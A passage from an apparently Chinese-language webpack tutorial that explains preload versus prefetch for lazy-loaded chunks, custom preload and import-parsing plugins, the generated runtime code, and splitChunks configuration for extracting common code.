id=\u0026#34;btn\u0026#34;\u0026gt;按钮\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; 项目在浏览器中打开后，网络面板的情况：\n可以看到，在没有点击按钮的情况下，懒加载文件就被预先加载到本地了，但是按钮的点击事件并没有执行，控制台并没有打印内容，当点击按钮后，没有再发起网络情况，而直接打印了懒加载文件的内容。这就加速的资源文件的获取速度，实现的想要的目的。\n自行实现@vue/preload-webpack-plugin 插件，完全一摸一样的实现。该插件不会去读取 import 函数中编写的魔法注释，只要是 import 方法加载的模块，都会自动加上其对应\u0026lt;link href=\u0026quot;moduleID.js\u0026quot; rel=\u0026quot;preload\u0026quot; as=\u0026quot;script\u0026quot;\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 /** * 原理和思路 * 此插件会查找本项目中所有的异步代码块， * 把这些异步代码块对应的JS文件都添加一个link标签, \u0026lt;link href=\u0026#34;moduleID.js\u0026#34; rel=\u0026#34;preload\u0026#34; as=\u0026#34;script\u0026#34;\u0026gt; */ const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); class PreloadWebpackPlugin { constructor() {} apply(compiler) { // 监听compilation钩子，获取compilation对象 compiler.hooks.compilation.tap( \u0026#34;PreloadWebpackPlugin\u0026#34;, function (compilation) { // 获取HtmlWebpackPlugin向compilation添加的钩子,alterAssetTags HtmlWebpackPlugin.getHooks(compilation).alterAssetTags.tap( \u0026#34;PreloadWebpackPlugin\u0026#34;, (htmlData) =\u0026gt; { const { chunks } = compilation; // chunks表示编译得到的所有代码块 const files = chunks .filter((chunk) =\u0026gt; !chunk.canBeInitial()) // chunk.canBeInitial()表示是否是同步引入的模块 .reduce((files, chunk) =\u0026gt; { return files.add(...chunk.files); }, new Set()); files.forEach((file) =\u0026gt; { htmlData.assetTags.styles.unshift({ tagName: \u0026#34;link\u0026#34;, attributes: { rel: \u0026#34;preload\u0026#34;, href: file, }, }); }); } ); } ); } } module.exports = PreloadWebpackPlugin; 从插件的源码可以得到 preload 的原理是在 webpack 打包阶段就将所有的异步加载的文件，生成一一对应的\u0026lt;link href=\u0026quot;moduleID.js\u0026quot; rel=\u0026quot;preload\u0026quot; as=\u0026quot;script\u0026quot;\u0026gt;，然后直接添加 html 的到 head 标签中。当浏览器一加载到 index.html 中，在解析 link 标签时就会直接去阻塞加载并执行对应的脚本文件。\npreload 不是 webpack 原生支持的，必须安装对应的插件，并且该插件不会根据 webpack 魔法注释来设置指定脚本的 preload，而是直接将项目中所有的异步加载脚本都 preload，所以需要慎用。\nhttps://webpack.docschina.org/api/module-methods#magic-comments\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 单个目标 import( /* webpackChunkName: \u0026#34;my-chunk-name\u0026#34; */ /* webpackMode: \u0026#34;lazy\u0026#34; */ /* webpackExports: [\u0026#34;default\u0026#34;, \u0026#34;named\u0026#34;] */ \u0026#34;module\u0026#34; ); // 多个可能的目标 import( /* webpackInclude: /\\.json$/ */ /* webpackExclude: /\\.noimport\\.json$/ */ /* webpackChunkName: \u0026#34;my-chunk-name\u0026#34; */ /* webpackMode: \u0026#34;lazy\u0026#34; */ /* webpackPrefetch: true */ /* webpackPreload: true */ `./locale/${language}` ); https://webpack.docschina.org/guides/code-splitting/#prefetchingpreloading-modules\nprefetch(预先拉取)\nprefetch 跟 preload 不同，它的作用是告诉浏览器未来可能会使用到的某个资源，浏览器就会在闲时（就是脚本执行完后）去加载对应的资源，若能预测到用户的行为，比如懒加载，点击到其它页面等则相当于提前预加载了需要的资源 prefetch 魔法注释是 webpack 原生就支持的，不需要配置任何插件，而且 webpack 对于/* webpackPrefetch:true */魔法注释是能识别的，只有加了/* webpackPrefetch:true */的脚本才会有 prefetch 的效果 ==prefetch 的原理是，在打包的脚本中动态的为需要 prefetch 的脚本创建 link 标签\u0026lt;link rel=\u0026quot;prefetch\u0026quot; as=\u0026quot;script\u0026quot; href=\u0026quot;url/moduleID\u0026quot;\u0026gt;并添加到 head 中，并不是在 webpack 打包阶段就创建并加入到 index.html 中== prefetch 实例\nindex.js:\n1 2 3 4 5 6 7 8 9 document.getElementById(\u0026#34;btn\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function () { // 一个有prefetch魔法注释，一个没有 import(/* webpackPrefetch:true */ \u0026#34;./video\u0026#34;).then((result) =\u0026gt; { console.log(result); }); import(\u0026#34;./title\u0026#34;).then((result) =\u0026gt; { console.log(result); }); }); title.js 和 video.js：\n1 2 3 4 export default \u0026#34;title\u0026#34;; export default \u0026#34;video.js\u0026#34;; index.html:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;btn\u0026#34;\u0026gt;按钮\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; webpack.config.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); module.exports = { output: { clean: true, }, mode: \u0026#34;development\u0026#34;, devtool: false, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, }), ], }; 打包后生成结果：\nindex.html：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;script defer src=\u0026#34;main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;btn\u0026#34;\u0026gt;按钮\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; main.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 var webpackModules = {}; var webpackModuleCache = {}; function webpackRequire(moduleId) { var cachedModule = webpackModuleCache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (webpackModuleCache[moduleId] = { exports: {}, }); webpackModules[moduleId](module, module.exports, webpackRequire); return module.exports; } webpackRequire.m = webpackModules; var deferred = []; webpackRequire.O = (result, chunkIds, fn, priority) =\u0026gt; { if (chunkIds) { priority = priority || 0; for (var i = deferred.length; i \u0026gt; 0 \u0026amp;\u0026amp; deferred[i - 1][2] \u0026gt; priority; i--) deferred[i] = deferred[i - 1]; deferred[i] = [chunkIds, fn, priority]; return; } var notFulfilled = Infinity; for (var i = 0; i \u0026lt; deferred.length; i++) { var [chunkIds, fn, priority] = deferred[i]; var fulfilled = true; for (var j = 0; j \u0026lt; chunkIds.length; j++) { if ( (priority \u0026amp; (1 === 0) || notFulfilled \u0026gt;= priority) \u0026amp;\u0026amp; Object.keys(webpackRequire.O).every((key) =\u0026gt; webpackRequire.O[key](chunkIds[j]) ) ) { chunkIds.splice(j--, 1); } else { fulfilled = false; if (priority \u0026lt; notFulfilled) notFulfilled = priority; } } if (fulfilled) { deferred.splice(i--, 1); var r = fn(); if (r !== undefined) result = r; } } return result; }; webpackRequire.F = {}; webpackRequire.E = (chunkId) =\u0026gt; { Object.keys(webpackRequire.F).map((key) =\u0026gt; { webpackRequire.F[key](chunkId); }); }; var getProto = Object.getPrototypeOf ? (obj) =\u0026gt; Object.getPrototypeOf(obj) : (obj) =\u0026gt; obj.proto; var leafPrototypes; webpackRequire.t = function (value, mode) { if (mode \u0026amp; 1) value = this(value); if (mode \u0026amp; 8) return value; if (typeof value === \u0026#34;object\u0026#34; \u0026amp;\u0026amp; value) { if (mode \u0026amp; 4 \u0026amp;\u0026amp; value.esmodule) return value; if (mode \u0026amp; 16 \u0026amp;\u0026amp; typeof value.then === \u0026#34;function\u0026#34;) return value; } var ns = Object.create(null); webpackRequire.r(ns); var def = {}; leafPrototypes = leafPrototypes || [ null, getProto({}), getProto([]), getProto(getProto), ]; for ( var current = mode \u0026amp; 2 \u0026amp;\u0026amp; value; typeof current == \u0026#34;object\u0026#34; \u0026amp;\u0026amp; !~leafPrototypes.indexOf(current); current = getProto(current) ) { Object.getOwnPropertyNames(current).forEach( (key) =\u0026gt; (def[key] = () =\u0026gt; value[key]) ); } def[\u0026#34;default\u0026#34;] = () =\u0026gt; value; webpackRequire.d(ns, def); return ns; }; webpackRequire.d = (exports, definition) =\u0026gt; { for (var key in definition) { if (webpackRequire.o(definition, key) \u0026amp;\u0026amp; !webpackRequire.o(exports, key)) { Object.defineProperty(exports, key, { enumerable: true, get: definition[key], }); } } }; webpackRequire.f = {}; webpackRequire.e = (chunkId) =\u0026gt; { return Promise.all( Object.keys(webpackRequire.f).reduce((promises, key) =\u0026gt; { webpackRequire.f[key](chunkId, promises); return promises; }, []) ); }; webpackRequire.u = (chunkId) =\u0026gt; { return \u0026#34;\u0026#34; + chunkId + \u0026#34;.js\u0026#34;; }; webpackRequire.g = (function () { if (typeof globalThis === \u0026#34;object\u0026#34;) return globalThis; try { return this || new Function(\u0026#34;return this\u0026#34;)(); } catch (e) { if (typeof window === \u0026#34;object\u0026#34;) return window; } })(); webpackRequire.o = (obj, prop) =\u0026gt; Object.prototype.hasOwnProperty.call(obj, prop); var inProgress = {}; var dataWebpackPrefix = \u0026#34;01split:\u0026#34;; webpackRequire.l = (url, done, key, chunkId) =\u0026gt; { if (inProgress[url]) { inProgress[url].push(done); return; } var script, needAttach; if (key !== undefined) { var scripts = document.getElementsByTagName(\u0026#34;script\u0026#34;); for (var i = 0; i \u0026lt; scripts.length; i++) { var s = scripts[i]; if ( s.getAttribute(\u0026#34;src\u0026#34;) == url || s.getAttribute(\u0026#34;data-webpack\u0026#34;) == dataWebpackPrefix + key ) { script = s; break; } } } if (!script) { needAttach = true; script = document.createElement(\u0026#34;script\u0026#34;); script.charset = \u0026#34;utf-8\u0026#34;; script.timeout = 120; if (webpackRequire.nc) { script.setAttribute(\u0026#34;nonce\u0026#34;, webpackRequire.nc); } script.setAttribute(\u0026#34;data-webpack\u0026#34;, dataWebpackPrefix + key); script.src = url; } inProgress[url] = [done]; var onScriptComplete = (prev, event) =\u0026gt; { script.onerror = script.onload = null; clearTimeout(timeout); var doneFns = inProgress[url]; delete inProgress[url]; script.parentNode \u0026amp;\u0026amp; script.parentNode.removeChild(script); doneFns \u0026amp;\u0026amp; doneFns.forEach((fn) =\u0026gt; fn(event)); if (prev) return prev(event); }; var timeout = setTimeout( onScriptComplete.bind(null, undefined, { type: \u0026#34;timeout\u0026#34;, target: script, }), 120000 ); script.onerror = onScriptComplete.bind(null, script.onerror); script.onload = onScriptComplete.bind(null, script.onload); needAttach \u0026amp;\u0026amp; document.head.appendChild(script); }; webpackRequire.r = (exports) =\u0026gt; { if (typeof Symbol !== \u0026#34;undefined\u0026#34; \u0026amp;\u0026amp; Symbol.toStringTag) { Object.defineProperty(exports, Symbol.toStringTag, { value: \u0026#34;Module\u0026#34;, }); } Object.defineProperty(exports, \u0026#34;esmodule\u0026#34;, { value: true, }); }; var scriptUrl; if (webpackRequire.g.importScripts) scriptUrl = webpackRequire.g.location + \u0026#34;\u0026#34;; var document = webpackRequire.g.document; if (!scriptUrl \u0026amp;\u0026amp; document) { if (document.currentScript) scriptUrl = document.currentScript.src; if (!scriptUrl) { var scripts = document.getElementsByTagName(\u0026#34;script\u0026#34;); if (scripts.length) { var i = scripts.length - 1; while (i \u0026gt; -1 \u0026amp;\u0026amp; !scriptUrl) scriptUrl = scripts[i--].src; } } } if (!scriptUrl) throw new Error(\u0026#34;Automatic publicPath is not supported in this browser\u0026#34;); scriptUrl = scriptUrl .replace(/#.*$/, \u0026#34;\u0026#34;) .replace(/\\?.*$/, \u0026#34;\u0026#34;) .replace(/\\/[^\\/]+$/, \u0026#34;/\u0026#34;); webpackRequire.p = scriptUrl; var installedChunks = { main: 0, }; webpackRequire.f.j = (chunkId, promises) =\u0026gt; { var installedChunkData = webpackRequire.o(installedChunks, chunkId) ? installedChunks[chunkId] : undefined; if (installedChunkData !== 0) { if (installedChunkData) { promises.push(installedChunkData[2]); } else { if (true) { var promise = new Promise( (resolve, reject) =\u0026gt; (installedChunkData = installedChunks[chunkId] = [resolve, reject]) ); promises.push((installedChunkData[2] = promise)); var url = webpackRequire.p + webpackRequire.u(chunkId); var error = new Error(); var loadingEnded = (event) =\u0026gt; { if (webpackRequire.o(installedChunks, chunkId)) { installedChunkData = installedChunks[chunkId]; if (installedChunkData !== 0) installedChunks[chunkId] = undefined; if (installedChunkData) { var errorType = event \u0026amp;\u0026amp; (event.type === \u0026#34;load\u0026#34; ? \u0026#34;missing\u0026#34; : event.type); var realSrc = event \u0026amp;\u0026amp; event.target \u0026amp;\u0026amp; event.target.src; error.message = \u0026#34;Loading chunk \u0026#34; + chunkId + \u0026#34; failed.\\n(\u0026#34; + errorType + \u0026#34;: \u0026#34; + realSrc + \u0026#34;)\u0026#34;; error.name = \u0026#34;ChunkLoadError\u0026#34;; error.type = errorType; error.request = realSrc; installedChunkData[1](error); } } }; webpackRequire.l(url, loadingEnded, \u0026#34;chunk-\u0026#34; + chunkId, chunkId); } } } }; webpackRequire.F.j = (chunkId) =\u0026gt; { if ( (!webpackRequire.o(installedChunks, chunkId) || installedChunks[chunkId] === undefined) \u0026amp;\u0026amp; true ) { installedChunks[chunkId] = null; var link = document.createElement(\u0026#34;link\u0026#34;); if (webpackRequire.nc) { link.setAttribute(\u0026#34;nonce\u0026#34;, webpackRequire.nc); } link.rel = \u0026#34;prefetch\u0026#34;; // 本行就体现了prefetch的具体原理 link.as = \u0026#34;script\u0026#34;; link.href = webpackRequire.p + webpackRequire.u(chunkId); document.head.appendChild(link); } }; webpackRequire.O.j = (chunkId) =\u0026gt; installedChunks[chunkId] === 0; var webpackJsonpCallback = (parentChunkLoadingFunction, data) =\u0026gt; { var [chunkIds, moreModules, runtime] = data; var moduleId, chunkId, i = 0; if (chunkIds.some((id) =\u0026gt; installedChunks[id] !== 0)) { for (moduleId in moreModules) { if (webpackRequire.o(moreModules, moduleId)) { webpackRequire.m[moduleId] = moreModules[moduleId]; } } if (runtime) var result = runtime(webpackRequire); } if (parentChunkLoadingFunction) parentChunkLoadingFunction(data); for (; i \u0026lt; chunkIds.length; i++) { chunkId = chunkIds[i]; if ( webpackRequire.o(installedChunks, chunkId) \u0026amp;\u0026amp; installedChunks[chunkId] ) { installedChunks[chunkId][0](); } installedChunks[chunkId] = 0; } return webpackRequire.O(result); }; var chunkLoadingGlobal = (self[\u0026#34;webpackChunk_01split\u0026#34;] = self[\u0026#34;webpackChunk_01split\u0026#34;] || []); chunkLoadingGlobal.forEach(webpackJsonpCallback.bind(null, 0)); chunkLoadingGlobal.push = webpackJsonpCallback.bind( null, chunkLoadingGlobal.push.bind(chunkLoadingGlobal) ); webpackRequire.O( 0, [\u0026#34;main\u0026#34;], () =\u0026gt; { webpackRequire.E(\u0026#34;src_video_js\u0026#34;); }, 5 ); var webpackExports = {}; document.getElementById(\u0026#34;btn\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function () { webpackRequire .e(\u0026#34;src_video_js\u0026#34;) .then(webpackRequire.t.bind(webpackRequire, \u0026#34;./src/video.js\u0026#34;, 23)) .then((result) =\u0026gt; { console.log(result); }); webpackRequire .e(\u0026#34;src_title_js\u0026#34;) .then(webpackRequire.bind(webpackRequire, \u0026#34;./src/title.js\u0026#34;)) .then((result) =\u0026gt; { console.log(result); }); }); webpackExports = webpackRequire.O(webpackExports); 其中 main.js 中有段代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 webpackRequire.F.j = (chunkId) =\u0026gt; { if ( (!webpackRequire.o(installedChunks, chunkId) || installedChunks[chunkId] === undefined) \u0026amp;\u0026amp; true ) { installedChunks[chunkId] = null; var link = document.createElement(\u0026#34;link\u0026#34;); if (webpackRequire.nc) { link.setAttribute(\u0026#34;nonce\u0026#34;, webpackRequire.nc); } link.rel = \u0026#34;prefetch\u0026#34;; // ++++++++++++++++++++++++++++ link.as = \u0026#34;script\u0026#34;; // ++++++++++++++++++++++++++++ link.href = webpackRequire.p + webpackRequire.u(chunkId); document.head.appendChild(link); } }; 从这段代码就能看出 prefetch 的工作原理和 preload 的不同了。prefetch 是在加载 main 并执行的时候采取通过 js 去创建 link 标签并加载需要 prefetch 的文件的，而 preload 则是直接通过 html-webpack-plugin 这个插件直接生成对应的 link 标签来预先加载对应的文件的。\n当打开 index.html 时，网络面板的情况：\n当点击按钮后，网络面板的情况：\nvideo.js 因为 prefetch 而直接走本地缓存了，而 title.js 因为没有配置 prefetch，所以走的是网络请求。\nprefetch 和 preload 混用的情况\n对于@vue/preload-webpack-plugin 插件，即使不写了 preload 的魔法注释也会生效，默认还是将全部懒加载的模块都设置为 preload。这样所有懒加载资源优先级都提高了很多，存在隐患。（如果想一个 script 脚本设置为 preload，预先拉取，他的优先级是非常高的，它应该和 main.js 并行加载，所以说不可能把插件 preload 脚本的的动作放在 main.js 里面执行时加载，只能把这个工作交给 html-webpack-plugin,动态的向 html 文件里插入链接）。\n为了解决 preload 无法生效的问题，自己写了一个插件：webpackpreload-webpack-plugin。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); const WebpackPreloadWebpackPlugin = require(\u0026#34;webpackpreload-webpack-plugin\u0026#34;); module.exports = { output: { clean: true, }, mode: \u0026#34;development\u0026#34;, devtool: false, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, }), new WebpackPreloadWebpackPlugin(), ], }; webpackpreload-webpack-plugin：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); class WebpackpreloadWebpackPlugin { apply(compiler) { compiler.hooks.compilation.tap(\u0026#34;PreloadWebpackPlugin\u0026#34;, (compilation) =\u0026gt; { HtmlWebpackPlugin.getHooks(compilation).alterAssetTags.tap( \u0026#34;PreloadWebpackPlugin\u0026#34;, (htmlData) =\u0026gt; { const { publicPath, assetTags } = htmlData; const { entrypoints, moduleGraph, chunkGraph } = compilation; for (const entrypoint of entrypoints) { // webpack内部已经识别好魔法注释中的prefetch和preload了，并将preload放置在getChildrenByOrders方法的返回值中了 const preloaded = entrypoint[1].getChildrenByOrders( moduleGraph, chunkGraph ).preload; // is ChunkGroup[] | undefined if (!preloaded) return; const chunks = new Set(); for (const group of preloaded) { for (const chunk of group.chunks) chunks.add(chunk); } const files = new Set(); for (const chunk of chunks) { for (const file of chunk.files) files.add(file); } const links = []; for (const file of files) { links.push({ tagName: \u0026#34;link\u0026#34;, attributes: { rel: \u0026#34;preload\u0026#34;, href: `${publicPath}${file}`, }, }); } assetTags.styles.unshift(...links); } } ); }); } } module.exports = WebpackpreloadWebpackPlugin; webpack 获取到源代码后，将源代码转为语法树进行遍历，遍历时捕获 import 节点，内部会自行识别魔法注释。\nplugins\\ImportPlugin.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class ImportPlugin { apply(compiler) { compiler.hooks.compilation.tap( \u0026#34;ImportPlugin\u0026#34;, (compilation, { normalModuleFactory }) =\u0026gt; { normalModuleFactory.hooks.parser .for(\u0026#34;javascript/auto\u0026#34;) .tap(\u0026#34;ImportPlugin\u0026#34;, (parser) =\u0026gt; { parser.hooks.importCall.tap(\u0026#34;ImportParserPlugin\u0026#34;, (expr) =\u0026gt; { const { options } = parser.parseCommentOptions(expr.range); console.log(options); }); }); } ); } } module.exports = ImportPlugin; 这个 webpack 插件的作用是为了解析 JavaScript 源代码中的 import 语句，并且提取出注释中的选项信息。\n具体来说，该插件在 Webpack 编译过程中的\u0026quot;compilation\u0026quot;阶段，注册了一个钩子函数用于处理普通模块工厂(normalModuleFactory)中的 JavaScript 模块。当解析 JavaScript 源代码时，该插件会在 import 调用的语法树节点中注册一个钩子函数，用于解析注释中的选项信息，并将其输出到控制台中。\n因此，这个插件的作用并不是修改代码的行为，而是提供了一种在 Webpack 编译过程中对代码进行静态分析的方式，以便于进行代码构建和优化。\n方式三 提取公共代码\nsplit-chunks-plugin split-chunks-plugin common-chunk-and-vendor-chunk 配置单页应用，配置多页应用 为什么需要提取公共代码\n大网站有多个页面，每个页面由于采用相同技术栈和样式代码，会包含很多公共代码，如果都包含进来会有问题 相同的资源被重复的加载，浪费用户的流量和服务器的成本； 每个页面需要加载的资源太大，导致网页首屏加载缓慢，影响用户体验。 如果能把公共代码抽离成单独文件进行加载能进行优化，可以减少网络传输流量，降低服务器成本 如何提取\n基础类库，方便长期缓存 页面之间的公用代码 各个页面单独生成文件 module chunk bundle\nmodule：就是 js 的模块化（一个文件就是一个模块），webpack 支持 commonJS、ES6 等模块化规范 chunk: chunk 是 webpack 根据功能拆分出来的，包含三种情况 项目入口（entry） 通过 import()动态引入的代码 通过 splitChunks 拆分出来的代码 bundle：bundle 是 webpack 打包之后的各个文件，一般就是和 chunk 是一对一的关系，bundle 就是对 chunk 进行编译压缩打包等处理之后的产出 splitChunks\nsplit-chunks-plugin 将optimization.runtimeChunk设置为 true 或 \u0026lsquo;multiple\u0026rsquo;，会为每个入口添加一个只含有 runtime 的额外 chunk 默认值\n默认情况下，它只会影响到按需加载的 chunks，因为修改 initial chunks 会影响到项目的 HTML 文件中的脚本标签。\nwebpack 将根据以下条件自动拆分 chunks：\n新的 chunk 可以被共享，或者模块来自于 node_modules 文件夹 新的 chunk 体积大于 20kb（在进行 min+gz 之前的体积） 当按需加载 chunks 时，并行请求的最大数量小于或等于 30 当加载初始化页面时，并发请求的最大数量小于或等于 30 当尝试满足最后两个条件时，最好使用较大的 chunks。\nwebpack.config.js ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 module.exports = { //... entry: { page1: \u0026#34;./src/page1.js\u0026#34;, page2: \u0026#34;./src/page2.js\u0026#34;, page3: \u0026#34;./src/page3.js\u0026#34;, }, optimization: { // 下面是默认的splitChunks splitChunks: { chunks: \u0026#34;all\u0026#34;, // 默认作用于异步chunk，值为all/initial/async minSize: 30000, // 默认值是30kb,代码块的最小尺寸 minRemainingSize: 0, minChunks: 1, // 表示在提取公共代码的时候，一个模块被多少个入口用入才会进行提取 maxAsyncRequests: 3, //限制异步模块内部的并行最大请求数的，说白了你可以理解为是每个import()它里面的最大并行请求数量 maxInitialRequests: 8, //限制入口的拆分数量 enforceSizeThreshold: 50000, name: true, //打包后的名称，默认是chunk的名字通过分隔符（默认是～）分隔开，如vendor~ automaticNameDelimiter: \u0026#34;~\u0026#34;, //默认webpack将会使用入口名和代码块的名称生成命名,比如 \u0026#39;vendors~main.js\u0026#39; cacheGroups: { // 缓存组 ， 当一个模块命中多个缓存组的规则时，则根据priority的值进行拆包 defaultVendors: { test: /[\\\\/]node_modules[\\\\/]/, priority: -10, // 越大，优先级高 reuseExistingChunk: true, }, default: { minChunks: 2, // 这里如果配置了，则这里的minChunks会覆盖外层的minChunks priority: -20, reuseExistingChunk: true, }, // .. 其他自定义规则即拆包名字 }, }, //把运行时当成一个代码块进行单独提取 //runtime 为了让打包后的代码在浏览器里能运行 要模拟一个require方法 这个就叫运行时 //可以把runtimeChunk设置为true就可以把运行时代码块单独提取，实现长期缓存 //因为运行时代码只是一个工具代码，跟业务无关，不管你的业务如何写，它始终不变 runtimeChunk: true, }, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, filename: \u0026#34;page1.html\u0026#34;, chunks: [\u0026#34;page1\u0026#34;], // 把page1和page1分拆出去的代码块生成的文件插入此模块 }), new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, filename: \u0026#34;page2.html\u0026#34;, chunks: [\u0026#34;page2\u0026#34;], }), new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, filename: \u0026#34;page3.html\u0026#34;, chunks: [\u0026#34;page3\u0026#34;], }), new webpackPreloadWebpackPlugin(), new ImportPlugin(), new AssetWebpackPlugin(), ], }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 { optimization: { //指定代码块的分割方式 表示选择哪些代码块进行分割，async(异步import) initial(同步) all（全部） splitChunks: { chunks: \u0026#39;all\u0026#39;, //表示分割出去的代码块最小的体积 0就是不限制分割出去的代码块的体积 minSize: 0, //加载入口文件时，并行请求的最大数量 默认为5 maxInitialRequests: 5,//一个chunk最多拆成5个包 // page1 module1 module2 jquery //按需加载文件时，并行请求的最大数量 默认为3 maxAsyncRequests: 3, //表示在提取公共代码的时候，一个模块被多少个入口用入才会进行提取 minChunks: 2, //在以前是没有cacheGroups这个概念 //默认情况下有二个缓存组 defaultVendors default cacheGroups: { defaultVendors: false, default: false, xxx: { minChunks: 1,//按这个条件，如果一个模块被 引用了1次以上，就需要被 提取到单独的代码块中 //需要把index.js提到到common代码块中，提取了以后main里就要删除index.js模块 //最终会有两个代码块 1个是空的main,一个是包括index.js的common //重用现在的代码块 false 不重用 //本来我要提取分割index.js,那么新分割出去的代码块里只有一个index.js //但是发现在现在main里也刚好有我想提取的代码块，直接把main当成分割出去代码复用 reuseExistingChunk: true//如果能重用，就不会再生成一个新的common代码块了，直接重用main.js // reuseExistingChunk表示如果当前的代码包含已经被从主bundle中分割出去的模块，它将会被重用，而不会生成一个新的代码块 } //第三方 //覆盖默认缓存组，因为我们有两个默认缓存组 defaultVendors,default /* defaultVendors: { test: /node_modules/,//如果模块的路径里有node_modules的话就属于这个vendor缓存组 priority: -10 }, default: { minChunks: 2, priority: -20 } */ } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 { optimization: { splitChunks: { // 表示选择哪些 chunks 进行分割，可选值有：async，initial和all chunks: \u0026#39;all\u0026#39;, // 表示新分离出的chunk必须大于等于minSize，默认为30000，约30kb。 minSize: 0,//默认值是20000,生成的代码块的最小尺寸 cacheGroups: { defaultVendors: { test: /[\\\\/]node_modules[\\\\/]/, //条件 priority: -10 ///优先级，一个chunk很可能满足多个缓存组，会被抽取到优先级高的缓存组中,为了能够让自定义缓存组有更高的优先级(默认0),默认缓存组的priority属性为负值. }, default: { minChunks: 2,////被多少模块共享,在分割之前模块的被引用次数 priority: -20 }, }, }, }, } 打包生成情况：\n1 2 3 4 5 6 7 8 9 10 11 12 //入口代码块 page1.js page2.js page3.js //异步加载代码块 src_asyncModule1_js.js //defaultVendors缓存组对应的代码块 defaultVendors-node_modules_jquery_dist_jquery_js.js defaultVendors-node_modules_lodash_lodash_js.js //default代缓存组对应的代码块 default-src_module1_js.js default-src_module2_js.js 模拟过程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 let page1Chunk = { name: \u0026#34;page1\u0026#34;, modules: [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;lodash\u0026#34;], }; let page2Chunk = { name: \u0026#34;page2\u0026#34;, module: [\u0026#34;C\u0026#34;, 